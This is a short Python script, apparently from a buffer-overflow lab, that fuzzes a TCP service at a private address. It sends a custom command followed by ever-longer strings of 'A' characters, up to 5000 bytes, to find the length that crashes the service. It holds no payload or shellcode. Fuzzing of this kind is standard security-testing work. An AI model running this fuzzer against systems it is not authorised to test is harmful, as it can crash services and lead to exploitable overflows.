#!/usr/bin/python
import socket

#fuzzing
counter = 50

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.85.130', 666))
command = "SUPERSECUREFUNC ."

for num in range(counter,5000,counter):
	buffer = "A" * num
	s.send(command + buffer)
	print("Fuzzing " + command + ": " + str(len(buffer)))
	response = s.recv(100)	